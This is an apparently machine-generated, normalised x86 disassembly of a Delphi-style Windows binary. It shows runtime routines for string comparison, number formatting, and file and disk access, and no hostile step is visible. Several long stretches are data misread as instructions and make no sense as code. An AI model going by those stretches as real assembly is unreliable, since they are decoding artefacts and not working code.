mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406f04
retn
sub_406f10
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406f35
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406f3c
retn
sub_406f48
push 0xf0004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add cl dh
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add dl dh
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add bl dh
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add ah dh
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add ch dh
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add dh dh
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add bh dh
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add al bh
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add cl bh
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add dl bh
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add bl bh
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add ah bh
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add ch bh
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add dh bh
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add bh bh
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add al ah
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add cl ah
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add dl ah
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add bl ah
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add ah ah
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add ch ah
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add dh ah
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add bh ah
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add al ch
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add cl ch
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add dl ch
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add bl ch
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add ah ch
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add ch ch
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add dh ch
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add bh ch
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add al dl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add cl dl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add dl dl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add bl dl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add ah dl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add ch dl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add dh dl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add bh dl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add al bl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add cl bl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add dl bl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add bl bl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add ah bl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add ch bl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add dh bl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add bh bl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add al al
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add cl al
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add dl al
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add bl al
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add ah al
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add ch al
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add dh al
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add bh al
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add al cl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add cl cl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add dl cl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add bl cl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add ah cl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add ch cl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add dh cl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add bh cl
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ eax + 0x680000ff ] dh
xchg [ edi ] al
mov cl 0xff
add [ eax ] al
push 0xb2004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ebx + 0x680000ff ] dh
xchg [ edi ] al
mov ah 0xff
add [ eax ] al
push 0xb5004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ esi + 0x680000ff ] dh
xchg [ edi ] al
mov bh 0xff
add [ eax ] al
push 0xb8004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ecx + 0x680000ff ] bh
xchg [ edi ] al
mov edx 0x680000ff
xchg [ edi ] al
mov ebx 0x680000ff
xchg [ edi ] al
mov esp 0x680000ff
xchg [ edi ] al
mov ebp 0x680000ff
xchg [ edi ] al
mov esi 0x680000ff
xchg [ edi ] al
mov edi 0x680000ff
xchg [ edi ] al
mov al [ 0x680000ff ]
xchg [ edi ] al
mov eax [ 0x680000ff ]
xchg [ edi ] al
mov [ 0x680000ff ] al
xchg [ edi ] al
mov [ 0x680000ff ] eax
xchg [ edi ] al
movsb [ edi ] [ esi ]
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ ebp + 0x680000ff ] ah
xchg [ edi ] al
cmpsb [ esi ] [ edi ]
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ edi + 0x680000ff ] ah
xchg [ edi ] al
test al 0xff
add [ eax ] al
push 0xa9004786
inc [ eax ]
add [ eax - 0x7a ] ch
inc edi
add [ edx + 0x550000ff ] ch
mov ebp esp
xor eax eax
push ebp
push sub_407245
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40724c
retn
sub_407d44
and eax 0x2f00407d
jge r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] bh
jge r-xdata
je r-xdata
add [ eax ] dh
add [ eax ] al
add [ edx + edx + 0x40 ] al
add [ eax ] dh
xor eax 0x59a80040
inc eax
add [ ecx + ebx * 2 + 0x35440040 ] dh
inc eax
add [ eax ] bh
xor eax 0x59c40040
inc eax
add [ edx + esi - 0x30bfffc0 ] bl
inc eax
add [ esp + edx * 2 ] ah
dec ebp
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0xd00407d ] al
jge r-xdata
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0x1d00407d ] dl
jge r-xdata
xor al 0x1
inc edi
add [ ebx + 0x34158910 ] cl
add [ edi ] eax
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
arpl [ eax + 0x72 ] bp
outsd
test eax 0xf08bffff
mov eax esi
xor ecx ecx
mov edx ebx
call sub_402cfc
mov eax esi
pop esi
pop ebx
push edx
popad
inc ebp
js r-xdata
add ah cl
jge r-xdata
add [ ecx ] al
add [ eax ] al
add [ edx - 0x74 ] dl
adc [ ebx - 0x71 ] bh
sbb eax 0xdf9c4cdb
push edi
loopne r-xdata
insb
jne r-xdata
imul esi [ ebp + 0x53 ] 0x68636e79
jb r-xdata
sbb [ 0x407d443f ] edi
add [ eax + eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
retn
jns r-xdata
imul esi [ esi + 0x65 ] 0x74697257
push ebx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_40278c
call ebx
pop ebx
retn
adc [ ecx + 0x47013415 ] cl
add [ ebx + 0x47799015 ] cl
add [ ebx + 0xa890448 ] cl
outsb
imul edi [ edx + 0x65 ] r-xdata
sub_407df4
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx eax
shr edx 0x10
div bx
mov ebx [ ebp + 0x8 ]
mov [ ecx ] ax
mov [ ebx ] dx
pop ebx
pop ebp
retn 0x4
sub_407e10
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8d0
call sub_403a74
pop edi
pop esi
pop ebx
retn
sub_407e34
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_40276c
mov esi eax
mov eax esi
xor ecx ecx
mov edx ebx
call sub_402cfc
mov eax esi
pop esi
pop ebx
retn
sub_407e54
push ebx
mov eax [ rw-data ]
mov edx [ eax ]
mov [ rw-data ] edx
mov edx [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ edx ] ecx
mov ebx [ eax + 0x8 ]
mov edx 0xc
call sub_40278c
call ebx
pop ebx
retn
sub_407e80
push ebx
mov ebx eax
mov eax 0xc
call sub_40276c
mov edx [ rw-data ]
mov [ eax ] edx
mov edx [ rw-data ]
mov edx [ edx ]
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] sub_407e54
pop ebx
retn
sub_407eb8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4042f8
mov ebx eax
mov eax edi
mov edx ebx
call sub_404684
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x61
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x7a
ja r-xdata
sub al 0x20
sub_407ef4
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4042f8
mov ebx eax
mov eax edi
mov edx ebx
call sub_404684
mov edx esi
mov esi [ edi ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al [ edx ]
cmp al 0x41
jb r-xdata
mov [ esi ] al
inc edx
inc esi
dec ebx
test ebx ebx
jne r-xdata
cmp al 0x5a
ja r-xdata
add al 0x20
sub_407f30
push esi
push edi
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
[ esi ] [ edi ]
je r-xdata
mov ecx edx
sub eax edx
pop edi
pop esi
retn
movzx eax [ esi - 0x1 ]
movzx edx [ edi - 0x1 ]
sub_407f60
push esi
push edi
mov esi eax
mov edi edx
mov edx ecx
xor eax eax
and edx 0x3
sar ecx 0x2
js r-xdata
inc eax
[ esi ] [ edi ]
jne r-xdata
pop edi
pop esi
retn
mov ecx edx
[ esi ] [ edi ]
jne r-xdata
sub_407f80
push esi
push edi
push ebx
mov esi eax
mov edi edx
or eax eax
je r-xdata
or edx edx
je r-xdata
mov eax [ eax - 0x4 ]
mov ecx eax
cmp ecx edx
jbe r-xdata
mov edx [ edx - 0x4 ]
cmp ecx ecx
mov ecx edx
sub eax edx
pop ebx
pop edi
pop esi
retn
mov bl [ esi - 0x1 ]
cmp bl 0x61
jb r-xdata
mov bh [ edi - 0x1 ]
cmp bh 0x61
jb r-xdata
cmp bl 0x7a
ja r-xdata
cmp bl bh
je r-xdata
cmp bh 0x7a
ja r-xdata
sub bl 0x20
[ esi ] [ edi ]
je r-xdata
movzx eax bl
movzx edx bh
sub bh 0x20
sub_407fd4
cmp eax edx
je r-xdata
mov al 0x1
or eax eax
je r-xdata
retn
or edx edx
je r-xdata
xor eax eax
retn
mov ecx [ eax - 0x4 ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
call sub_407f80
test eax eax
jne r-xdata
sub_407ff8
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_4042f8
mov ebx eax
mov eax esi
call sub_4044f8
mov edx eax
mov eax edi
mov ecx ebx
call sub_404128
test ebx ebx
jle r-xdata
pop edi
pop esi
pop ebx
retn
push ebx
mov eax [ edi ]
push eax
call CharLowerBuffA
sub_40802c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4042f8
push eax
mov eax esi
call sub_4044f8
push eax
mov eax ebx
call sub_4042f8
push eax
mov eax ebx
call sub_4044f8
push eax
push 0x0
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_408064
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4042f8
push eax
mov eax esi
call sub_4044f8
push eax
mov eax ebx
call sub_4042f8
push eax
mov eax ebx
call sub_4044f8
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop esi
pop ebx
retn
sub_4080b4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
push ebx
push edi
push ebx
push esi
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
pop edi
pop esi
pop ebx
retn
sub_4080d4
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax edi
call sub_4042f8
mov esi eax
mov ebx 0x1
jmp r-xdata
cmp esi ebx
jl r-xdata
cmp esi ebx
jge r-xdata
cmp [ edi + ebx - 0x1 ] 0x20
jbe r-xdata
cmp [ edi + esi - 0x1 ] 0x20
jbe r-xdata
mov eax ebp
call sub_404038
jmp r-xdata
inc ebx
dec esi
push ebp
mov ecx esi
sub ecx ebx
inc ecx
mov edx ebx
mov eax edi
call sub_404558
pop ebp
pop edi
pop esi
pop ebx
retn
sub_408124
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov eax esi
call sub_4042f8
test eax eax
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov al [ esi ]
add al 0xbf
sub al 0x1a
jb r-xdata
mov eax esi
call sub_4042f8
sub eax 0x2
jl r-xdata
sub al 0x4
je r-xdata
mov bl 0x1
inc eax
mov edi 0x2
add al 0xfe
sub al 0x1a
jae r-xdata
inc edi
dec eax
jne r-xdata
add dl 0xf9
sub dl 0x1a
jb r-xdata
mov dl [ esi + edi - 0x1 ]
add dl 0xd0
sub dl 0xa
jb r-xdata
sub dl 0x4
je r-xdata
add dl 0xfe
sub dl 0x1a
jae r-xdata
sub_408188
or cl cl
jne r-xdata
push edx
push esi
or eax eax
jns sub_40819e
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
neg eax
call sub_40819e
mov al 0x2d
inc ecx
dec esi
mov [ esi ] al
retn
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_40819e
mov ecx 0xa
push edx
push esi
mov [ esi ] dl
or eax eax
jne r-xdata
add dl 0x7
xor edx edx
div ecx
dec esi
add dl 0x30
cmp dl 0x3a
jb r-xdata
pop ecx
pop edx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
add ecx edx
mov al 0x30
sub esi edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_4081d4
push esi
mov esi esp
sub esp 0x10
xor ecx ecx
push edx
xor edx edx
call sub_408188
mov edx esi
pop eax
call sub_404128
add esp 0x10
pop esi
retn
sub_4081f4
or cl cl
jne sub_408228
mov ecx 0xa
test [ eax + 0x4 ] 0x80000000
je sub_408228
push [ eax + 0x4 ]
push [ eax ]
mov eax esp
neg [ esp ]
adc [ esp + 0x4 ] 0x0
neg [ esp + 0x4 ]
call sub_408228
mov [ esi - 0x1 ] 0x2d
dec esi
inc ecx
add esp 0x8
retn
sub_408228
push esi
sub esp 0x4
fnstcw [ esp + 0x2 ]
fnstcw [ esp ]
or [ esp ] 0xf00
fldcw [ esp ]
mov [ esp ] cx
fld1
test [ eax + 0x4 ] 0x80000000
je r-xdata
fild [ eax ]
push [ eax + 0x4 ]
push [ eax ]
and [ esp + 0x4 ] 0x7fffffff
push 0x7fffffff
push 0xffffffff
fild [ esp + 0x8 ]
fild [ esp ]
fadd st2
faddp st1
add esp 0x10
jmp r-xdata
mov [ esi ] al
fld st1
fcom st3
fwait
fnstsw ax
sahf
jae r-xdata
add al 0x7
fild [ esp ]
fld st1
dec esi
fprem
fistp [ esp ]
fdiv st1
mov al [ esp ]
add al 0x30
cmp al 0x3a
jb r-xdata
fldcw [ esp + 0x2 ]
add esp 0x4
ffree st3
ffree st2
ffree st1
ffree st0
pop ecx
sub ecx esi
sub edx ecx
jbe r-xdata
retn
sub esi edx
mov al 0x30
add ecx edx
jmp r-xdata
dec edx
jne r-xdata
mov [ edx + esi ] al
mov [ esi ] al
sub_4082c0
push ebp
mov ebp esp
push esi
mov esi esp
sub esp 0x20
xor ecx ecx
push eax
xor edx edx
lea eax [ ebp + 0x8 ]
call sub_4081f4
mov edx esi
pop eax
call sub_404128
add esp 0x20
pop esi
pop ebp
retn 0x8
sub_4082e8
cmp edx 0x20
jbe r-xdata
push esi
mov esi esp
sub esp 0x20
push ecx
mov ecx 0x10
call sub_408188
mov edx esi
pop eax
call sub_404128
add esp 0x20
pop esi
retn
xor edx edx
sub_408310
push ebx
push esi
add esp 0xfffffff4
mov ebx eax
mov edx esp
mov eax ebx
call sub_402d1c
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax esi
add esp 0xc
pop esi
pop ebx
retn
mov [ esp + 0x4 ] ebx
mov [ esp + 0x8 ] 0xb
lea edx [ esp + 0x4 ]
mov eax [ rw-data ]
xor ecx ecx
call sub_407e10
sub_408364
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_402d1c
mov [ esi ] eax
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_408384
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_404e84
mov [ esi ] eax
mov [ esi + 0x4 ] edx
cmp [ esp ] 0x0
sete al
pop edx
pop esi
pop ebx
retn
sub_4083a4
mov eax [ rw-data ]
call sub_4050b4
test eax eax
jne r-xdata
mov eax [ rw-data ]
call sub_4050b4
test eax eax
jne r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405270
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_40408c
retn
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_405270
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_40408c
sub_408434
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
mov esi edx
test esi esi
jl r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
mov ebx eax
add ebx 0x4
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx ]
call sub_40809c
test al al
je r-xdata
sub_408470
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4096a4
mov edx eax
test dl dl
je r-xdata
call sub_4083a4
push ebp
mov eax [ rw-data ]
call sub_4050bc
mov edx eax
mov eax [ rw-data ]
call sub_408434
pop ecx
mov edx eax
test dl dl
je r-xdata
fld [ ebp - 0x10 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
setne [ ebx ]
jmp r-xdata
push ebp
mov eax [ rw-data ]
call sub_4050bc
mov edx eax
mov eax [ rw-data ]
call sub_408434
pop ecx
mov edx eax
test dl dl
je r-xdata
mov [ ebx ] 0x1
jmp r-xdata
mov eax edx
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebx ] 0x0
sub_40850c
push ebx
push esi
mov esi ecx
mov ebx eax
test dl dl
je r-xdata
mov eax esi
xor edx edx
mov dl bl
mov edx [ edx * 4 + rw-data ]
call sub_40408c
call sub_4083a4
test bl bl
je r-xdata
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_40408c
pop esi
pop ebx
retn
mov eax esi
mov edx [ rw-data ]
mov edx [ edx ]
call sub_40408c
jmp r-xdata
pop esi
pop ebx
retn
sub_408558
push ebx
push esi
push edi
mov ebx edx
mov edi eax
or eax 0xffffffff
mov esi ebx
and esi 0x3
cmp esi 0x2
ja r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
and edx 0xf0
cmp edx 0x40
ja r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
mov eax ebx
and eax 0xf0
shr eax 0x4
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ esi * 4 + rw-data ]
push eax
mov eax edi
call sub_4044f8
push eax
call CreateFileA
sub_4085b0
push ebx
mov ebx eax
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0xc0000000
mov eax ebx
call sub_4044f8
push eax
call CreateFileA
pop ebx
retn
sub_4085dc
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call ReadFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_408608
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push edi
push esi
push ebx
call WriteFile
test eax eax
jne r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] 0xffffffff
sub_408634
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
push esi
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push ebx
call SetFilePointer
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_408674
push ebx
push esi
mov esi eax
mov eax esi
call sub_4042f8
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop esi
pop ebx
retn
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40c1d4
cmp al 0x2
je r-xdata
dec ebx
lea eax [ esi + ebx - 0x1 ]
pop esi
pop ebx
retn
sub_4086a4
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax esi
call sub_4042f8
mov edi eax
mov eax ebx
call sub_4044f8
mov ebp eax
test edi edi
jle r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov bl [ esi + edi - 0x1 ]
test bl bl
je r-xdata
dec edi
test edi edi
jg r-xdata
mov edx ebx
mov eax ebp
call sub_4089d4
test eax eax
je r-xdata
mov edx edi
mov eax esi
call sub_40c1d4
cmp al 0x2
jne r-xdata
dec edi
sub_4086f4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx ebx
mov eax r-xdata
call sub_4086a4
mov esi eax
push edi
lea edx [ esi + 0x1 ]
mov ecx 0x7fffffff
mov eax ebx
call sub_404558
pop edi
pop esi
pop ebx
retn
sub_40872c
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_4086a4
mov ebx eax
test ebx ebx
jle r-xdata
mov eax edi
call sub_404038
cmp [ esi + ebx - 0x1 ] 0x2e
jne r-xdata
push edi
mov ecx 0x7fffffff
mov edx ebx
mov eax esi
call sub_404558
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_408774
push ebx
push esi
add esp 0xfffffef8
mov esi edx
mov ebx eax
push esp
lea eax [ esp + 0x8 ]
push eax
push 0x104
mov eax ebx
call sub_4044f8
push eax
call GetFullPathNameA
mov ecx eax
lea edx [ esp + 0x4 ]
mov eax esi
call sub_404128
add esp 0x108
pop esi
pop ebx
retn
sub_4087b0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
lea edx [ ebp - 0xc ]
push edx
lea edx [ ebp - 0x8 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call GetDiskFreeSpaceA
mov ebx eax
mov eax [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
xor edx edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0xc ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404e60
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax [ ebp - 0x10 ]
xor edx edx
push edx
push eax
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
call sub_404e60
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
sub_408860
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
mov eax edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop esi
pop edi
retn
sub_408888
push edi
push esi
mov esi eax
mov edi edx
mov ecx 0xffffffff
xor al al
[ edi ]
not ecx
mov edi esi
mov esi edx
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea eax [ edi - 0x1 ]
pop esi
pop edi
retn
sub_4088b4
push edi
push esi
push ebx
mov esi eax
mov edi edx
mov ebx ecx
xor al al
test ecx ecx
je r-xdata
sub ebx ecx
mov edi esi
mov esi edx
mov edx edi
mov ecx ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
stosb [ edi ]
mov eax edx
pop ebx
pop esi
pop edi
retn
[ edi ]
jne r-xdata
inc ecx
sub_4088e8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
call sub_4042f8
push eax
mov eax ebx
call sub_4044f8
mov edx eax
mov eax esi
pop ecx
call sub_4088b4
pop esi
pop ebx
retn
sub_40890c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
call sub_4044f8
mov edx eax
mov ecx edi
mov eax ebx
call sub_4088b4
pop edi
pop esi
pop ebx
retn
sub_40892c
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
mov dl [ edi - 0x1 ]
sub eax edx
pop esi
pop edi
retn
sub_408950
push edi
push esi
mov edi edx
mov esi eax
mov ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov edi edx
xor edx edx
pop esi
pop edi
retn
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_408990
push edi
push esi
push ebx
mov edi edx
mov esi eax
mov ebx ecx
xor eax eax
or ecx ecx
je r-xdata
pop ebx
pop esi
pop edi
retn
[ edi ]
sub ebx ecx
mov ecx ebx
mov edi edx
xor edx edx
mov al [ esi - 0x1 ]
cmp al 0x61
jb r-xdata
mov dl [ edi - 0x1 ]
cmp dl 0x61
jb r-xdata
cmp al 0x7a
ja r-xdata
sub eax edx
je r-xdata
cmp dl 0x7a
ja r-xdata
sub al 0x20
[ esi ] [ edi ]
je r-xdata
sub dl 0x20
sub_4089e8
push edi
push esi
push ebx
or eax eax
je r-xdata
xor eax eax
or edx edx
je r-xdata
mov ebx eax
mov edi edx
xor al al
mov ecx 0xffffffff
[ edi ]
not ecx
dec ecx
je r-xdata
mov esi ecx
mov edi ebx
mov ecx 0xffffffff
[ edi ]
not ecx
sub ecx esi
jbe r-xdata
mov edi ebx
lea ebx [ esi - 0x1 ]
mov eax ecx
push edi
mov ecx ebx
[ esi ] [ edi ]
pop edi
mov ecx eax
jne r-xdata
mov esi edx
lodsb [ esi ]
[ edi ]
jne r-xdata
lea eax [ edi - 0x1 ]
jmp r-xdata
pop ebx
pop esi
pop edi
retn
sub_408a5c
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
call sub_408824
mov esi eax
inc esi
mov eax esi
call sub_408a3c
mov ecx esi
mov edx ebx
call sub_408850
pop esi
pop ebx
retn
xor eax eax
pop esi
pop ebx
retn
sub_408a98
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx ecx
mov esi edx
mov edi eax
cmp ebx 0x1f
